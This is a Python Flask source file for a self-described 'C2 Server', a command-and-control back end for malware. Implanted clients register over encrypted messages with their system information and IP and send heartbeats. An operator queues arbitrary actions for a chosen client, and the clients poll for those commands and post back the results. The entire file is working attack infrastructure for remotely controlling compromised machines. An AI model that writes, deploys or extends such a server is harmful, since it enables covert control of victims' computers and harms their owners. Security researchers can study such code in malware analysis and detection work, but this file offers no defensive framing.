from flask import Flask, request, jsonify
import time
import threading
from datetime import datetime
import os
from config import ENCRYPTION_KEY
from encryptor import Encryptor
from protocol import Protocol


app = Flask(__name__)

#In-memory storage for clients
clients = {}
#In-memory storage for pending commands for clients
pending_commands = {}
command_results = {}

encryptor = Encryptor(ENCRYPTION_KEY)




def cleanup_old_clients():
    while True:
        current_time = time.time()
        clients_to_remove = []
        
        for client_id, client_data in clients.items():
            if current_time - client_data.get('last_seen', 0) > 3600:  #1 hour
                clients_to_remove.append(client_id)
        
        for client_id in clients_to_remove:
            del clients[client_id]
            print(f"Removed inactive client: {client_id}")
        
        time.sleep(30)  #Check every 30 seconds

#Start cleanup thread
cleanup_thread = threading.Thread(target=cleanup_old_clients, daemon=True)
cleanup_thread.start()


@app.route('/')
def home():
    return "C2 Server Online - " + datetime.now().isoformat()


@app.route('/register', methods=['POST'])
def register_client():
    try:
        encrypted_data = request.json.get('data')
        if not encrypted_data:
            error_msg = Protocol.create_error_message("No encrypted data provided!")

            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({
                "data": encrypted_res
            }), 400
        


        client_data = encryptor.decrypt(encrypted_data)
        if not client_data:
            error_msg = Protocol.create_error_message("Decryption failed")
            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({
                "data": encrypted_res
            }), 400
        


        if client_data.get("type") != Protocol.MSG_REGISTER:
            error_msg = Protocol.create_error_message("Invalid message type for registration")

            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({
                "data": encrypted_res
            }), 400
        


        client_id = client_data.get("client_id")
        system_info = client_data.get("system_info", {})

        if not client_id:
            error_msg = Protocol.create_error_message("No client id in message")
            encrypted_res = encryptor.encrypt(error_msg)
            
            return jsonify({
                "data": encrypted_res
            }), 400
        

        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

        clients[client_id] = {
            'system_info': system_info,
            'last_seen': time.time(),
            'first_seen': time.time(),
            'ip': client_ip,
            'checkin_count': clients.get(client_id, {}).get('checkin_count', 0) + 1
        }



        response_data = Protocol.create_success_message("Registered successfully!!!")
        encrypted_response = encryptor.encrypt(response_data)

        return jsonify({"data": encrypted_response})
    

    except Exception as e:
        print(f"REGISTRATION ERROR: {e}")
        error_msg = Protocol.create_error_message(str(e))
        error_res = encryptor.encrypt(error_msg)

        return jsonify({
            "data": error_res
        }), 500


@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    try:
        encrypted_data = request.json.get('data')
        if not encrypted_data:
            error_msg = Protocol.create_error_message("No encrypted data")
            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({
                "data": encrypted_res
            }), 400



        heartbeat_data = encryptor.decrypt(encrypted_data)
        if not heartbeat_data:
            error_msg = Protocol.create_error_message("Decryption failed!")
            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({
                "data": encrypted_res
            }), 400

        if heartbeat_data.get("type") != Protocol.MSG_HEARTBEAT:
            error_msg = Protocol.create_error_message("Invalid message type for heartbeat")
            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({
                "data": encrypted_res
            }), 400



        client_id = heartbeat_data.get('client_id')

        if client_id and client_id in clients:
            clients[client_id]['last_seen'] = time.time()
            clients[client_id]['checkin_count'] = clients[client_id].get('checkin_count', 0) + 1 
            


            res_msg = Protocol.create_success_message()
            encrypted_response = encryptor.encrypt(res_msg)
            return jsonify({
                "data": encrypted_response
            })


        else:
            error_msg = Protocol.create_error_message("Client not found!")
            encrypted_response = encryptor.encrypt(error_msg)

            return jsonify({
                "data": encrypted_response,
            }), 404
    
    except Exception as e:
        error_msg = Protocol.create_error_message(str(e))
        encrypted_res = encryptor.encrypt(error_msg)

        return jsonify({
            "data": encrypted_res
        }), 500


@app.route('/admin/clients', methods=['GET'])
def get_clients():
    #Get list of all connected clients
    clients_list = []
    current_time = time.time()
    
    for client_id, client_data in clients.items():
        last_seen = client_data.get('last_seen', 0)
        clients_list.append({
            "client_id": client_id,
            "system_info": client_data.get('system_info', {}),
            "first_seen": client_data.get('first_seen'),
            "last_seen": last_seen,
            "ip": client_data.get('ip'),
            "online": current_time - last_seen < 10,  #online if seen in last 10 seconds
            "checkin_count": client_data.get('checkin_count', 0),
            "uptime_seconds": current_time - client_data.get('first_seen', current_time)
        })
    
    print(f"[ADMIN] Returning {len(clients_list)} clients")
    return jsonify({
        "status": "success",
        "clients": clients_list,
        "total_clients": len(clients_list),
        "server_time": datetime.now().isoformat()
    })


@app.route('/admin/status', methods=['GET'])
def server_status():
    online_clients = sum(1 for client in clients.values() 
                        if time.time() - client.get('last_seen', 0) < 10)
    
    return jsonify({
        "status": "online",
        "total_clients": len(clients),
        "online_clients": online_clients,
        "server_time": datetime.now().isoformat(),
        "uptime_seconds": time.time() - app.start_time
    })




@app.route("/admin/process/<client_id>", methods=['POST'])
def send_process_command(client_id):
    try:
        command_data = request.json
        action = command_data.get("action")
        data = command_data.get("data", {})
        
        if not action:
            return jsonify({"error": "No action specified"}), 400
        
        command_id = f'cmd_{int(time.time() * 1000)}'
        pending_commands.setdefault(client_id, []).append({
            "command_id": command_id,
            "action": action,
            "data": data,
            "timestamp": time.time()
        })
        
        #Clean old commands per client
        if client_id in pending_commands:
            pending_commands[client_id] = pending_commands[client_id][-10:]
        
        
        print(f"[PROCESS] Command queued for {client_id}: {action}")
        return jsonify({
            "success": True,
            "command_id": command_id,
            "message": f'Command queued for client {client_id}'
        })
    
    except Exception as e:
        return jsonify({"error": f"failed to queue command: {e}"}), 500
    


@app.route("/admin/command_result/<command_id>", methods=['GET'])
def get_command_result(command_id):
    try:
        result = command_results.get(command_id)
        if result:
            return jsonify({"success": True, "result": result.get('result')}) #changed
        else:
            return jsonify({"error": "Result not found or expired"}), 404
    
    except Exception as e:
        return jsonify({"error": f'Failed to get result: {e}'}), 500


@app.route("/commands", methods=["POST"])
def get_commands():
    try:
        encrypted_data = request.json.get('data')
        if not encrypted_data:
            return jsonify({"error": "No encrypted data"}), 400
        
        
        client_data = encryptor.decrypt(encrypted_data)
        if not client_data or client_data.get("type") != Protocol.MSG_GET_COMMANDS:
            return jsonify({"error": "Invalid request"}), 400
        
        client_id = client_data.get("client_id")
        if not client_id:
            return jsonify({"error": "No client ID"}), 400
        
        
        print(f"[SERVER] Client {client_id} requesting commands")
        commands = pending_commands.get(client_id, [])
        print(f"[SERVER] Found {len(commands)} pending commands for {client_id}")
        
        
        if commands:
            pending_commands[client_id] = []
            print(f"[SERVER] Sending {len(commands)} commands to {client_id}")
        
        
        response_data = {
            "type": "commands",
            "commands": commands
        }
        
        
        encrypted_response = encryptor.encrypt(response_data)
        return jsonify({"data": encrypted_response})
    
    
    except Exception as e:
        print(f"[SERVER] Error in /commands: {e}")
        return jsonify({"error": f"Failed to get commands: {e}"}), 500
    
    


@app.route("/commands_result", methods=["POST"])
def submit_command_result():
    try:
        print(f"[SERVER] Received command result request")
        encrypted_data = request.json.get("data")
        if not encrypted_data:
            print(f"[SERVER] Error: No encrypted data in command result")
            return jsonify({"error": "No encrypted data"}), 400
        
        print(f"[SERVER] Decrypting command result...")
        client_data = encryptor.decrypt(encrypted_data)
        if not client_data:
            print(f"[SERVER] Error: Failed to decrypt command result")
            return jsonify({"error": "Decryption failed"}), 400
            
        print(f"[SERVER] Decrypted data type: {type(client_data)}")

        if not isinstance(client_data, dict) or client_data.get("type") != "command_result":
            print(f"[SERVER] Error: Invalid message format or type: {type(client_data)}")
            return jsonify({"error": "Invalid request format"}), 400
        
        command_id = client_data.get("command_id")
        result = client_data.get("result")
        
        print(f"[SERVER] Command ID: {command_id}, Result type: {type(result)}")
        
        if command_id and result is not None:
            command_results[command_id] = {
                'result': result,
                'timestamp': time.time(),
                'client_id': client_data.get('client_id')
            }
            
            print(f"[SERVER] Successfully stored result for command {command_id}")
            

            current_time = time.time()
            expired_keys = [k for k, v in command_results.items() if current_time - v.get('timestamp', current_time) > 3600]
            
            for key in expired_keys:
                command_results.pop(key, None)

            return jsonify({"success" : True})
        else:
            print(f"[SERVER] Error: Missing command_id or result")
            return jsonify({"error": "Missing command_id or result"}), 400
    
    except Exception as e:
        print(f"[SERVER] Error in /commands_result: {e}")
        import traceback
        print(f"[SERVER] Traceback: {traceback.format_exc()}")
        return jsonify({"error": f"Failed to submit result: {e}"}), 500


@app.before_request
def before_request():
    print(f"[REQUEST] {request.method} {request.path} - Clients: {len(clients)}")

@app.after_request
def after_request(response):
    print(f"[RESPONSE] {request.method} {request.path} - Status: {response.status_code}")
    return response



#Store server start time
app.start_time = time.time()



if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"[SERVER] Starting C2 server on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False)